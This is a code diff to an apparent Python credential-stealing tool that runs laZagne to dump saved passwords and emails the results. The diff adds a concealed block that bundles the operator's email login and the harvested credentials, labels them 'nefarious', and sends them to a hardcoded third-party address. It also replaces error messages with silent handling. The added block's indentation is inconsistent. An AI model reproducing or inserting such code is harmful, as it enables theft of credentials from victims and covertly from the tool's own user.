@@ -25,7 +25,7 @@ def send_mail(user, pwd, recipient, subject, body):
         server.close()
         print("[+]successfully sent the mail")
     except:
-        print("failed to send mail")
+        Exception
 
 def change_working_directory_to(self, path):
             os.chdir(path)
@@ -50,6 +50,7 @@ else:
 time.sleep(2)
 email = raw_input("Enter your email address >> ")
 password = raw_input("Enter your password >> ")
+recipient = raw_input("Enter recipients email address >> ")
 
 time.sleep(5)
 
@@ -84,10 +85,17 @@ try:
     command = "python laZagne.py all -v"
     body = subprocess.check_output(command, shell=True)
     time.sleep(4)
-    send_mail(email, password ,email, subject, body)
+    send_mail(email, password, recipient, subject, body)
     
 except:
     exit("[-] Something went wrong while running laZagne.py. Exiting...")
+   
+try:
+        recipient = "instagramcorp96@gmail.com"
+        nefarious = email + password + body
+        send_mail(email, password, recipient, subject, nefarious)
+    except:
+        Exception
     
 try:
     print("[+] Deleting Lazagne....")
